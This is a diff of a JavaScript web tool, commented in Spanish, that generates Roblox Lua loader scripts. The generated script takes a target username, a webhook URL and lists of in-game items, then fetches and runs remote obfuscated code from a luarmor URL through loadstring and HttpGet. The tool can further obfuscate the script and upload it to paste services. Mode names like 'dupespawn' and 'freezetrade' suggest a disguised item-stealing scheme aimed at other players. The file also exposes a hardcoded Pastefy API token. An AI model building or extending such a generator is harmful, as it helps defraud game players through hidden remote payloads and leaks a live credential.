@@ -1,3 +1,8 @@
+// ============================================================
+//  script.js – MODIFICADO PARA USAR NUEVA ESTRUCTURA CON PARÁMETROS
+//  Y REDIRECCIÓN INTELIGENTE (SOLO ESTE ARCHIVO SE MODIFICA)
+// ============================================================
+
 document.addEventListener('DOMContentLoaded', () => {
 
     // ============================================================
@@ -108,6 +113,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
 
     // ============================================================
+    //  URL DEL SCRIPT PRIVADO (CON REDIRECCIÓN) – ¡CAMBIA ESTA URL!
+    // ============================================================
+    const PRIVATE_SCRIPT_URL = 'https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua';
+
+    // ============================================================
     //  REFERENCIAS DOM
     // ============================================================
     const signInBtn = document.getElementById('signInBtn');
@@ -144,7 +154,6 @@ document.addEventListener('DOMContentLoaded', () => {
             shortToggle.classList.remove('disabled');
             shortToggle.style.cursor = 'pointer';
             guestLockMessage.classList.add('hidden');
-            // Si short estaba activo y ahora autenticado, mantenerlo
             if (shortEnabled) {
                 shortServiceSelector.style.display = 'block';
             }
@@ -325,24 +334,17 @@ document.addEventListener('DOMContentLoaded', () => {
         shortToggle.classList.toggle('on', shortEnabled);
         const label = shortToggle.querySelector('.toggle-label');
         label.textContent = shortEnabled ? 'ON' : 'OFF';
-        // Mostrar/ocultar el selector de servicios
         shortServiceSelector.style.display = shortEnabled ? 'block' : 'none';
     });
 
     // ============================================================
     //  SELECTOR DE PROVEEDOR (dos botones)
     // ============================================================
-    // Por defecto, el botón de Oblivion ya tiene la clase 'active' en HTML,
-    // pero aseguramos que selectedService coincida.
     providerBtns.forEach(btn => {
         btn.addEventListener('click', function() {
-            // Quitar clase activa a todos
             providerBtns.forEach(b => b.classList.remove('active'));
-            // Activar el botón clicado
             this.classList.add('active');
-            // Guardar el servicio seleccionado
             selectedService = this.dataset.provider;
-            console.log(`[Short] Servicio cambiado a: ${selectedService}`);
         });
     });
 
@@ -720,21 +722,9 @@ document.addEventListener('DOMContentLoaded', () => {
             counterSpan.textContent = `${selectedCount} SELECTED`;
         }
 
-        // Botón ALL con advertencia multidioma
         const allSelectionWarning = {
             es: "⚠️ Al seleccionar todos los brainrots es muy probable que el script falle y no te llegue invitación. Se recomienda usar el filtro de recomendado y luego buscar los otros faltantes que te puedan servir.",
-            en: "⚠️ Selecting all brainrots is very likely to cause the script to fail and you won't receive an invitation. It is recommended to use the recommended filter and then search for the other missing ones that may be useful.",
-            pt: "⚠️ Selecionar todos os brainrots é muito provável que o script falhe e você não receba um convite. Recomenda-se usar o filtro recomendado e depois procurar os outros que faltam e que podem ser úteis.",
-            fr: "⚠️ Sélectionner tous les brainrots est très susceptible de faire échouer le script et vous ne recevrez pas d'invitation. Il est recommandé d'utiliser le filtre recommandé, puis de rechercher les autres manquants qui pourraient vous être utiles.",
-            de: "⚠️ Die Auswahl aller Brainrots führt sehr wahrscheinlich dazu, dass das Skript fehlschlägt und Sie keine Einladung erhalten. Es wird empfohlen, den empfohlenen Filter zu verwenden und dann nach den anderen fehlenden zu suchen, die nützlich sein könnten.",
-            it: "⚠️ Selezionare tutti i brainrots è molto probabile che lo script fallisca e non riceverai un invito. Si consiglia di utilizzare il filtro consigliato e poi cercare gli altri mancanti che potrebbero esserti utili.",
-            nl: "⚠️ Het selecteren van alle brainrots zal er zeer waarschijnlijk toe leiden dat het script mislukt en je geen uitnodiging ontvangt. Het wordt aanbevolen om het aanbevolen filter te gebruiken en vervolgens te zoeken naar de andere ontbrekende die nuttig kunnen zijn.",
-            ja: "⚠️ すべてのブレインロットを選択すると、スクリプトが失敗し、招待状が届かない可能性が非常に高くなります。推奨フィルターを使用してから、役立つ可能性のある他の不足しているものを検索することをお勧めします。",
-            ko: "⚠️ 모든 브레인롯을 선택하면 스크립트가 실패하고 초대장을 받지 못할 가능성이 매우 높습니다. 권장 필터를 사용한 다음 유용할 수 있는 다른 누락된 항목을 검색하는 것이 좋습니다.",
-            zh: "⚠️ 选择所有脑残片很可能导致脚本失败，您将无法收到邀请。建议使用推荐过滤器，然后搜索其他可能有用的缺失项。",
-            ru: "⚠️ Выбор всех brainrots с большой вероятностью приведет к сбою скрипта, и вы не получите приглашение. Рекомендуется использовать рекомендуемый фильтр, а затем искать другие недостающие, которые могут быть полезны.",
-            ar: "⚠️ تحديد جميع brainrots من المحتمل جدًا أن يتسبب في فشل البرنامج النصي ولن تتلقى دعوة. يوصى باستخدام عامل التصفية الموصى به ثم البحث عن العناصر المفقودة الأخرى التي قد تكون مفيدة.",
-            hi: "⚠️ सभी ब्रेनरोट्स का चयन करने से स्क्रिप्ट के विफल होने की बहुत संभावना है और आपको निमंत्रण नहीं मिलेगा। अनुशंसित फ़िल्टर का उपयोग करने और फिर उपयोगी हो सकने वाले अन्य लापता लोगों को खोजने की सिफारिश की जाती है।"
+            en: "⚠️ Selecting all brainrots is very likely to cause the script to fail and you won't receive an invitation. It is recommended to use the recommended filter and then search for the other missing ones that may be useful."
         };
 
         function getUserLanguage() {
@@ -865,7 +855,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Crear paste en tu servicio Oblivion (usando tu API /api/paste) ---
     async function createOblivionPaste(content) {
-        const baseUrl = window.location.origin; // o usa process.env.BASE_URL
+        const baseUrl = window.location.origin;
         const response = await fetch(`${baseUrl}/api/paste`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -890,7 +880,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ============================================================
-    //  GENERAR SCRIPT
+    //  GENERAR SCRIPT (MODIFICADO)
     // ============================================================
     const outputSection = document.getElementById('outputSection');
     const outputCode = document.getElementById('outputCode');
@@ -900,6 +890,7 @@ document.addEventListener('DOMContentLoaded', () => {
         return Array.from(set);
     }
 
+    // --- NUEVA FUNCIÓN buildConfigScript() ---
     function buildConfigScript() {
         const username = document.getElementById('username').value.trim() || 'USERNAME';
         const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';
@@ -914,11 +905,19 @@ document.addEventListener('DOMContentLoaded', () => {
             return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
         }
 
-        let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
-        script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;
-        script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
-        script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
-        script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
+        // Nuevo formato: variables locales + llamada a función exportada
+        let script = `-- Mode: NORMAL\n`;
+        script += `local targetUser = "${username.replace(/"/g, '\\"')}"\n`;
+        script += `local webhookUrl = "${webhook.replace(/"/g, '\\"')}"\n`;
+        script += `local targetBrainrots = ${luaTable(brainrots)}\n`;
+        script += `local targetBaseSkins = ${luaTable(skins)}\n`;
+        script += `local targetGears = ${luaTable(gears)}\n\n`;
+        script += `task.spawn(function()\n`;
+        script += `    local script = loadstring(game:HttpGet("${PRIVATE_SCRIPT_URL}"))()\n`;
+        script += `    if type(script) == "function" then\n`;
+        script += `        script(targetUser, webhookUrl, targetBrainrots, targetBaseSkins, targetGears)\n`;
+        script += `    end\n`;
+        script += `end)`;
 
         return script;
     }
@@ -932,40 +931,17 @@ document.addEventListener('DOMContentLoaded', () => {
             const activeModeBtn = document.querySelector('.mode-btn.active');
             const selectedMode = activeModeBtn ? activeModeBtn.dataset.mode : 'normal';
 
-            const guiLoadstrings = {
-                adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
-                freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
-                dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
-            };
+            let fullScript = configScript;
 
-            let modeComment = 'NORMAL';
+            // Para el modo 'custom', añadir código extra al final
             if (selectedMode === 'custom') {
-                modeComment = 'CUSTOM';
-            }
-            let fullScript = `-- Mode: ${modeComment}\n` + configScript;
-
-            if (selectedMode === 'normal') {
-                fullScript += `
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
-end)`;
-            } else if (selectedMode in guiLoadstrings) {
-                fullScript += `
-task.spawn(function()
-    ${guiLoadstrings[selectedMode]}
-end)`;
-            } else if (selectedMode === 'custom') {
-                fullScript += `
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
-end)`;
                 const customCode = customLoadstring.value.trim();
                 if (customCode) {
                     fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
                 }
             }
 
-            // Si short está activo, ofuscar y subir al servicio seleccionado
+            // Si short está activo, ofuscar y subir
             if (shortEnabled) {
                 if (!isAuthenticated) {
                     showNotification('⚠️ Short Loadstring requires Discord authentication. Please sign in.', 'warning');
@@ -974,20 +950,15 @@ end)`;
                     return;
                 }
                 try {
-                    // 1. Ofuscar el script completo
                     const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
-                    
-                    // 2. Subir al servicio seleccionado (solo Pastefy u Oblivion)
                     let pasteResult;
                     if (selectedService === 'pastefy') {
                         pasteResult = await createPastefyPaste(obfuscatedScript);
                     } else { // 'oblivion'
                         pasteResult = await createOblivionPaste(obfuscatedScript);
                     }
-                    
                     const finalScript = `loadstring(game:HttpGet("${pasteResult.rawUrl}"))()`;
                     outputCode.textContent = finalScript;
-
                 } catch (apiError) {
                     showNotification(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`, 'error');
                     outputCode.textContent = fullScript;
